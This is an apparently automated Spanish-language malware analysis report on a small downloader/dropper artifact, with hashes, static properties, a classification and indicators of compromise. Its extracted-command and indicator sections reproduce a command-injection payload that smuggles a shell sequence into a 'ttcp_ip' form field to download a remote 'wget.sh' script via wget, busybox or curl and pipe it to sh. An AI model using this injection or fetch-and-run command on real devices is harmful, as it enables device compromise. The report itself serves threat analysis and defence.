# 🧬 Payload Analysis

`f6e453c748f58a3936b9e09dc6766720d455e8d5e26726a2d9b6a83c463dc997`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 441 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f6e453c748f58a3936b9e09dc6766720d455e8d5e26726a2d9b6a83c463dc997`
- **SHA1:** `d89b7a9d101fb14a5a2ae78ed10cbf705445def4`
- **MD5:** `4fdab695a687ff2ddfabcb80fb8349cc`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 441 B |
| Entropía | 5.29 |
| Strings | 6 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lmoon%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lmoon%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lmoon%60&StartEPI=1 | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX | strings |
| hash | f6e453c748f58a3936b9e09dc6766720d455e8d5e26726a2d9b6a83c463dc997 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
